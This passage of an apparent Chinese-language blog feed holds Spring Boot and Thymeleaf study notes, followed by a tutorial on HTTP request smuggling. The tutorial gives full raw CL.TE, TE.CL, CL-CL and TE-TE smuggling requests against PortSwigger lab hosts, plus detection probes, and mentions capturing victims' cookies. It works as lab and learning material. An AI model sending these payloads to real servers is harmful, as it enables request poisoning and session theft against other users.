java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> staticPathPattern <span class=\"token operator\">=</span> <span class=\"token string\">\"/**\"</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>在这里找到</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token annotation punctuation\">@ConfigurationProperties</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    prefix <span class=\"token operator\">=</span> <span class=\"token string\">\"spring.mvc\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>分析 addResourceHandlers 这个方法</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>resourceProperties<span class=\"token punctuation\">.</span><span class=\"token function\">isAddMappings</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>logger<span class=\"token punctuation\">.</span><span class=\"token function\">debug</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Default resource handling disabled\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>是如果自己在 application.properties 里面加上</p>\n<pre><code>spring.mvc.static-path-pattern=路径\n</code></pre>\n<p>是自己添加静态资源的路径</p>\n<p>若不自己给路径：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>                <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">addResourceHandler</span><span class=\"token punctuation\">(</span>registry<span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>mvcProperties<span class=\"token punctuation\">.</span><span class=\"token function\">getWebjarsPathPattern</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"classpath:/META-INF/resources/webjars/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>                <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">addResourceHandler</span><span class=\"token punctuation\">(</span>registry<span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>mvcProperties<span class=\"token punctuation\">.</span><span class=\"token function\">getStaticPathPattern</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>registration<span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>                    registration<span class=\"token punctuation\">.</span><span class=\"token function\">addResourceLocations</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>resourceProperties<span class=\"token punctuation\">.</span><span class=\"token function\">getStaticLocations</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这里就是默认的路径，但是在我们自己创建的文件中没见到 webjars 目录</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202504151932162.png\" alt=\"image-20250415193204101\" /></p>\n<p>这里就是 webjars 文件的导入，可以在浏览器中直接搜索 webjars</p>\n<pre><code>https://www.webjars.org/\n</code></pre>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202504151933619.png\" alt=\"image-20250415193327384\" /></p>\n<p>这里</p>\n<p>在 pom,xml 这里用来导入依赖就好了</p>\n<p>在</p>\n<pre><code>&lt;dependencies&gt;在这里加入要加的依赖就行了&lt;/dependencies&gt;\n</code></pre>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202504152042124.png\" alt=\"image-20250415204215473\" /></p>\n<p>在静态资源这里可以直接访问网站里面导入包的文件</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>servletContext <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">ServletContextResource</span> resource <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ServletContextResource</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>servletContext<span class=\"token punctuation\">,</span> <span class=\"token string\">\"/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>     registration<span class=\"token punctuation\">.</span><span class=\"token function\">addResourceLocations</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Resource</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span>resource<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>最后就是这个</p>\n<h3 id=\"模板引擎themeleaf\"><a class=\"anchor\" href=\"#模板引擎themeleaf\">#</a> 模板引擎 themeleaf</h3>\n<p>依赖：</p>\n<pre><code>&lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;\n        &lt;/dependency&gt;\n</code></pre>\n<p>这个可以在 templates 目录下有一个 index.html</p>\n<p>在部署后 http://localhost:8080 这个下有一个默认的 index.html 就是这个 index.html</p>\n<p>想访问 templates 下的其他 html 就得在 Controller 目录下写 java 来处理请求</p>\n<p>简单就是：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>studyweb<span class=\"token punctuation\">.</span>controller</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>stereotype<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Controller</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>bind<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">GetMapping</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token annotation punctuation\">@Controller</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> _12333Controller <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token annotation punctuation\">@GetMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/12333\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">\"12333\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>en<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>UTF-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>Title<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span><span class=\"token punctuation\">></span></span>sqwe<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202504161942415.png\" alt=\"image-20250416194243305\" /></p>\n<h3 id=\"thymeleaf模板语法\"><a class=\"anchor\" href=\"#thymeleaf模板语法\">#</a> Thymeleaf 模板语法：</h3>\n<pre><code>th:each循环\nth:if if语句\n\n提取文本：th:text   /   th:utext(文本里的标签也会解析)\n \n\n</code></pre>\n<p>示例：</p>\n<pre><code>&lt;h3 th:each=&quot;user:$&#123;users&#125;&quot; th:text=&quot;$&#123;user&#125;&quot;&gt;&lt;/h3&gt;\n&lt;h3 th:each=&quot;user:$&#123;users&#125;&quot; [[$user]]&gt;&lt;/h3&gt;\n</code></pre>\n<p>这个将 users 的东西用 user 遍历一遍，将每一次遍历的对象用位版本提取出来</p>\n<h4 id=\"装配扩展springmvc\"><a class=\"anchor\" href=\"#装配扩展springmvc\">#</a> 装配扩展 SpringMVC</h4>\n<p>感觉这个就是在 model 创建一个对象，我能在 repository 这里继承 JpaRepository：</p>\n<pre><code>JpaRepository 是 Spring Data JPA 提供的一个接口，它是用来简化数据库访问操作的。它本身是一个泛型接口，继承自 PagingAndSortingRepository 和 CrudRepository，也就是说它不仅支持基本的增删改查（CRUD）功能，还支持分页和排序。\n</code></pre>\n<p>然后可以用里面的一个方法：</p>\n<pre><code>JpaRepository&lt;T, ID&gt; 提供了很多现成的方法，比如：\n\nsave(entity)：保存或更新一条记录\n\nfindById(id)：根据主键查找\n\nfindAll()：查找所有记录\n\ndeleteById(id)：根据主键删除\n\ncount()：统计记录总数\n\nexistsById(id)：判断某条记录是否存在\n</code></pre>\n<h4 id=\"重新开始\"><a class=\"anchor\" href=\"#重新开始\">#</a> 重新开始：</h4>\n",
            "tags": []
        },
        {
            "id": "http://odiws.github.io/2025/04/07/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E/",
            "url": "http://odiws.github.io/2025/04/07/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E/",
            "title": "http请求走私漏洞",
            "date_published": "2025-04-07T11:32:02.000Z",
            "content_html": "<h2 id=\"http请求走私漏洞\"><a class=\"anchor\" href=\"#http请求走私漏洞\">#</a> http 请求走私漏洞</h2>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202504072035586.png\" alt=\"image-20250407203504542\" /></p>\n<p>记得先把这个 Content-Length 更新修改</p>\n<h3 id=\"http-11的特性\"><a class=\"anchor\" href=\"#http-11的特性\">#</a> Http 1.1 的特性</h3>\n<h4 id=\"keepalive\"><a class=\"anchor\" href=\"#keepalive\">#</a> keepalive</h4>\n<p>tcp 的连接，再建立一次 tcp 连接的时候，他不会把 tcp 连接关掉，会一直挂起来，再有 tcp 请求时，还会用这个 tcp 连接请求，会将挂起来的 tcp 连接再用一次</p>\n<h4 id=\"pipeline\"><a class=\"anchor\" href=\"#pipeline\">#</a> pipeline</h4>\n<p>可以在同一个请求发送两个 http 的包</p>\n<p>我可以利用这个特性传两个包，一个是正常的合法的包，一个是我的 payload 包，上传后会发送到后端，正常的和 payload 包一起传到后端，执行第二个请求</p>\n<p>还有一种就是我发送两个包，但是只执行了一个包的内容，那么这个包不会被丢弃，而是在其他人请求的时候执行这个包</p>\n<h3 id=\"http请求走私漏洞的类型\"><a class=\"anchor\" href=\"#http请求走私漏洞的类型\">#</a> Http 请求走私漏洞的类型：</h3>\n<h4 id=\"clte\"><a class=\"anchor\" href=\"#clte\">#</a> CLTE</h4>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202504072006774.png\" alt=\"image-20250407200604565\" /></p>\n<p>用这个 payload 上传两次时，第一次时前端看的时 Content-Length 是 35 个字符，是符合要求的，但是传入后端时，后端看的时 Transfer-Encoding 是 chunked</p>\n<p>用这个的意义是可以用来将 post 的数据进行块传输，但是他的特性是在遇到 0\\r\\n\\r\\n 也就是 0 后面连续两个回车时，就会终止 ，也就是</p>\n<pre><code>POST / HTTP/1.1\nHost: YoUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 35\nTransfer-Encoding: chunked\n</code></pre>\n<p>这里为一个请求</p>\n<pre><code>GET /404 HTTP/1.1\nX-Ignore:X\n</code></pre>\n<p>这里为一个请求，他会储存在服务器的缓存中，那么下次请求时就是 404</p>\n<p>进阶可以用 0\\r\\n\\r\\na: 拼接受害者的 cookie 发送给自己（因为 tcp 连接连接的是自己的 tcp 连接，别人访问的也是你的 tcp 连接）</p>\n<p>header 和数据要空一行，\\r\\n 是两个字符</p>\n<h3 id=\"cl不为0的get请求\"><a class=\"anchor\" href=\"#cl不为0的get请求\">#</a> CL 不为 0 的 GET 请求</h3>\n<p>前端代理服务器允许 GET 请求携带请求体，但后端服务器不允许 GET 请求携带请求体，则后端服务器会忽略掉 GET 请求中的 <code>Content-Length</code> ，不进行处理，从而导致请求走私。</p>\n<pre><code>GET / HTTP/1.1\\r\\n\nHost: example.com\\r\\n\nContent-Length: 44\\r\\n\n\nGET / secret HTTP/1.1\\r\\n\nHost: example.com\\r\\n\n\\r\\n\n</code></pre>\n<p>前端服务器收到该请求，通过读取 <code>Content-Length</code> ，判断这是一个完整的请求，然后转发给后端服务器，而后端服务器收到后，因为它不对 <code>Content-Length</code>  进行处理，由于 <code>Pipeline</code>  的存在，它就认为这是收到了两个请求。</p>\n<h3 id=\"32-cl-cl\"><a class=\"anchor\" href=\"#32-cl-cl\">#</a> 3.2 CL-CL</h3>\n<p>假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回 400 错误，但是中间代理服务器按照第一个 <code>Content-Length</code>  的值对请求进行处理，而后端服务器按照第二个 <code>Content-Length</code>  的值进行处理。这样有可能引发请求走私。</p>\n<pre><code>POST / HTTP/1.1\\r\\n\nHost: example.com\\r\\n\nContent-Length: 8\\r\\n\nContent-Length: 7\\r\\n\n\n12345\\r\\n\na\n</code></pre>\n<p>前端代理服务器获取的数据包长度为 8，将以上数据包完整转发至后端服务器，但后端服务器仅接收长度为 7 的数据包。因此读取前 7 个字符后，后端服务器认为本次请求已经读取完毕，然后返回响应。</p>\n<p>但此时缓冲区仍留下一个 a，对于后端服务器来讲，这个 a 是下一个请求的一部分，但没传输完毕。如果此时传来一个请求</p>\n<pre><code>GET / HTTP/1.1\nHOST: test.com\n</code></pre>\n<p>那么前端服务器和后端服务器将重用 TCP 连接，使后端实际接收的请求为：</p>\n<pre><code>aGET / HTTP/1.1\nHOST: test.com\n</code></pre>\n<p>从而实现了一次 HTTP 请求攻击。</p>\n<h3 id=\"33-cl-te\"><a class=\"anchor\" href=\"#33-cl-te\">#</a> 3.3 CL-TE</h3>\n<p>所谓 <code>CL-TE</code> ，就是当收到存在两个请求头的请求包时，前端代理服务器只处理 <code>Content-Length</code>  这一请求头，而后端服务器会遵守 <code>RFC2616</code>  的规定，忽略掉 <code>Content-Length</code> ，处理 <code>Transfer-Encoding</code>  这一请求头。</p>\n<p>chunk 传输数据格式如下，其中 size 的值由 16 进制表示。</p>\n<pre><code>[chunk size][\\r\\n][chunk data][\\r\\n][chunk size][\\r\\n][chunk data][\\r\\n][chunk size = 0][\\r\\n][\\r\\n]\n</code></pre>\n<p>Lab 地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3JlcXVlc3Qtc211Z2dsaW5nL2xhYi1iYXNpYy1jbC10ZQ==\">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</span></p>\n<p>构造数据包</p>\n<pre><code>POST / HTTP/1.1\\r\\n\nHost: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net\\r\\n\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\\r\\n\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n\nAccept-Language: en-US,en;q=0.5\\r\\n\nCookie: session=E9m1pnYfbvtMyEnTYSe5eijPDC04EVm3\\r\\n\nConnection: keep-alive\\r\\n\nContent-Length: 6\\r\\n\nTransfer-Encoding: chunked\\r\\n\n\\r\\n\n0\\r\\n\n\\r\\n\nG\n</code></pre>\n<p>连续发送几次请求就可以获得该响应。</p>\n<p><img data-src=\"https://image.3001.net/images/20200716/1594912302.png!small\" alt=\"image-20200714222119186\" /></p>\n<p>由于前端服务器处理 <code>Content-Length</code> ，所以这个请求对于它来说是一个完整的请求，请求体的长度为 6，也就是</p>\n<pre><code>0\\r\\n\n\\r\\n\nG\n</code></pre>\n<p>当请求包经过代理服务器转发给后端服务器时，后端服务器处理 <code>Transfer-Encoding</code> ，当它读取到 <code>0\\r\\n\\r\\n</code>  时，认为已经读取到结尾了，但是剩下的字母 <code>G</code>  就被留在了缓冲区中，等待后续请求的到来。当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求。</p>\n<pre><code>GPOST / HTTP/1.1\\r\\n\nHost: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net\\r\\n\n......\n</code></pre>\n<p>服务器在解析时当然会产生报错了。</p>\n<h3 id=\"34-te-cl\"><a class=\"anchor\" href=\"#34-te-cl\">#</a> 3.4 TE-CL</h3>\n<p>所谓 <code>TE-CL</code> ，就是当收到存在两个请求头的请求包时，前端代理服务器处理 <code>Transfer-Encoding</code>  这一请求头，而后端服务器处理 <code>Content-Length</code>  请求头。</p>\n<p>Lab 地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3JlcXVlc3Qtc211Z2dsaW5nL2xhYi1iYXNpYy10ZS1jbA==\">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</span></p>\n<p>构造数据包</p>\n<pre><code>POST / HTTP/1.1\\r\\n\nHost: acf41f441edb9dc9806dca7b00000035.web-security-academy.net\\r\\n\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\\r\\n\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n\nAccept-Language: en-US,en;q=0.5\\r\\n\nCookie: session=3Eyiu83ZSygjzgAfyGPn8VdGbKw5ifew\\r\\n\nContent-Length: 4\\r\\n\nTransfer-Encoding: chunked\\r\\n\n\\r\\n\n12\\r\\n\nGPOST / HTTP/1.1\\r\\n\n\\r\\n\n0\\r\\n\n\\r\\n\n</code></pre>\n<p><img data-src=\"https://image.3001.net/images/20200716/1594912316.png!small\" alt=\"image-20200714225318848\" /></p>\n<p>由于前端服务器处理 <code>Transfer-Encoding</code> ，当其读取到 <code>0\\r\\n\\r\\n</code>  时，认为是读取完毕了，此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理 <code>Content-Length</code>  请求头，当它读取完 <code>12\\r\\n</code>  之后，就认为这个请求已经结束了，后面的数据就认为是另一个请求了，也就是</p>\n<pre><code>GPOST / HTTP/1.1\\r\\n\n\\r\\n\n0\\r\\n\n\\r\\n\n</code></pre>\n<p>成功报错。</p>\n<h3 id=\"35-te-te\"><a class=\"anchor\" href=\"#35-te-te\">#</a> 3.5 TE-TE</h3>\n<p><code>TE-TE</code> ，也很容易理解，当收到存在两个请求头的请求包时，前后端服务器都处理 <code>Transfer-Encoding</code>  请求头，这确实是实现了 RFC 的标准。不过前后端服务器毕竟不是同一种，这就有了一种方法，我们可以对发送的请求包中的 <code>Transfer-Encoding</code>  进行某种混淆操作，从而使其中一个服务器不处理 <code>Transfer-Encoding</code>  请求头。从某种意义上还是 <code>CL-TE</code>  或者 <code>TE-CL</code> 。</p>\n<p>Lab 地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3JlcXVlc3Qtc211Z2dsaW5nL2xhYi1vZnVzY2F0aW5nLXRlLWhlYWRlcg==\">https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</span></p>\n<p>构造数据包</p>\n<pre><code>POST / HTTP/1.1\\r\\n\nHost: ac4b1fcb1f596028803b11a2007400e4.web-security-academy.net\\r\\n\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\\r\\n\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n\nAccept-Language: en-US,en;q=0.5\\r\\n\nCookie: session=Mew4QW7BRxkhk0p1Thny2GiXiZwZdMd8\\r\\n\nContent-length: 4\\r\\n\nTransfer-Encoding: chunked\\r\\n\nTransfer-encoding: cow\\r\\n\n\\r\\n\n5c\\r\\n\nGPOST / HTTP/1.1\\r\\n\nContent-Type: application/x-www-form-urlencoded\\r\\n\nContent-Length: 15\\r\\n\n\\r\\n\nx=1\\r\\n\n0\\r\\n\n\\r\\n\n</code></pre>\n<p><img data-src=\"https://image.3001.net/images/20200716/1594912328.png!small\" alt=\"image-20200714233446131\" /></p>\n<p>需要 <code>\\r\\n\\r\\n</code>  在后面加上尾随序列 <code>0</code> 。</p>\n<h2 id=\"4-查找http请求走私漏洞\"><a class=\"anchor\" href=\"#4-查找http请求走私漏洞\">#</a> 4、查找 HTTP 请求走私漏洞</h2>\n<h3 id=\"41-使用计时技术查找http请求走私漏洞\"><a class=\"anchor\" href=\"#41-使用计时技术查找http请求走私漏洞\">#</a> 4.1 使用计时技术查找 HTTP 请求走私漏洞</h3>\n<p>检测 HTTP 请求走私漏洞的最普遍有效方法是发送请求，如果存在漏洞，该请求将导致应用程序响应中的时间延迟。</p>\n<h4 id=\"411-使用计时技术查找clte漏洞\"><a class=\"anchor\" href=\"#411-使用计时技术查找clte漏洞\">#</a> 4.1.1 使用计时技术查找 CL.TE 漏洞</h4>\n<p>如果应用程序容易受到请求走私的 CL.TE 变体的攻击，则发送如下所示的请求通常会导致时间延迟：</p>\n<pre><code>POST / HTTP/1.1\nHost: vulnerable-website.com\nTransfer-Encoding: chunked\nContent-Length: 4\n\n1\nA\nX\n</code></pre>\n<p>由于前端服务器使用 <code>Content-Length</code>  标头，因此它将仅转发此请求的一部分，而忽略 <code>X</code> 。后端服务器使用 <code>Transfer-Encoding</code>  标头，处理第一个块，然后等待下一个块到达。这将导致明显的时间延迟。</p>\n<h4 id=\"412-使用计时技术查找tecl漏洞\"><a class=\"anchor\" href=\"#412-使用计时技术查找tecl漏洞\">#</a> 4.1.2 使用计时技术查找 TE.CL 漏洞</h4>\n<p>如果应用程序容易受到 TE.CL 变种的请求走私攻击，则发送如下所示的请求通常会导致时间延迟：</p>\n<pre><code>POST / HTTP/1.1\nHost: vulnerable-website.com\nTransfer-Encoding: chunked\nContent-Length: 6\n\n0\n\nX\n</code></pre>\n<p>由于前端服务器使用 <code>Transfer-Encoding</code>  标头，因此它将仅转发此请求的一部分，而忽略 <code>X</code> 。后端服务器使用 <code>Content-Length</code>  标头，期望消息正文中有更多内容，然后等待其余内容到达。这将导致明显的时间延迟。</p>\n<blockquote>\n<p>如果应用程序容易受到该漏洞的 CL.TE 变体的攻击，则基于时间的 TE.CL 漏洞测试可能会破坏其他应用程序用户。因此，要隐身并最大程度地减少中断，您应该首先使用 CL.TE 测试，只有在第一个测试失败的情况下才继续进行 TE.CL 测试。</p>\n</blockquote>\n<h3 id=\"42-使用差异响应确认http请求走私漏洞\"><a class=\"anchor\" href=\"#42-使用差异响应确认http请求走私漏洞\">#</a> 4.2 使用差异响应确认 HTTP 请求走私漏洞</h3>\n<p>当检测到可能的请求走私漏洞时，您可以利用此漏洞触发应用程序响应内容的差异来获取该漏洞的进一步证据。这涉及快速连续地向应用程序发送两个请求：</p>\n<ul>\n<li>一种 “攻击” 请求，旨在干扰下一个请求的处理。</li>\n<li>“正常” 请求。</li>\n</ul>\n<h4 id=\"421-使用差异响应确认clte漏洞\"><a class=\"anchor\" href=\"#421-使用差异响应确认clte漏洞\">#</a> 4.2.1 使用差异响应确认 CL.TE 漏洞</h4>\n<p>要确认 CL.TE 漏洞，您将发送如下攻击请求：</p>\n<pre><code>POST /search HTTP/1.1\nHost: vulnerable-website.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 50\nTransfer-Encoding: chunked\n\ne\nq=smuggling&amp;x=\n0\n\nGET /404 HTTP/1.1\nFoo: x\n</code></pre>\n<p>如果攻击成功，则后端服务器会将此请求的最后两行视为属于接收到的下一个请求。这将导致随后的 “正常” 请求如下所示：</p>\n<pre><code>GET /404 HTTP/1.1\nFoo: xPOST /search HTTP/1.1\nHost: vulnerable-website.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 11\n\nq=smuggling\n</code></pre>\n<p>由于此请求现在包含无效的 URL，因此服务器将以状态代码 404 进行响应，指示攻击请求确实确实对其进行了干扰。</p>\n<p>Lab 地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3JlcXVlc3Qtc211Z2dsaW5nL2ZpbmRpbmcvbGFiLWNvbmZpcm1pbmctY2wtdGUtdmlhLWRpZmZlcmVudGlhbC1yZXNwb25zZXM=\">https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses</span></p>\n<p>构造数据包：</p>\n<pre><code>POST / HTTP/1.1\nHost: ac201f6c1fc9901e8087240700e3006a.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: session=Jcr7wr0rAtPCIePHi3MpPtKYvXX6Oe3p\nUpgrade-Insecure-Requests: 1\nContent-Length: 35\nTransfer-Encoding: chunked\n\n0\n\nGET /404 HTTP/1.1\nX-Ignore: X\n</code></pre>\n<p><img data-src=\"https://image.3001.net/images/20200716/1594912349.png!small\" alt=\"image-20200715110310018\" /></p>\n<h4 id=\"422-使用差分响应确认tecl漏洞\"><a class=\"anchor\" href=\"#422-使用差分响应确认tecl漏洞\">#</a> 4.2.2 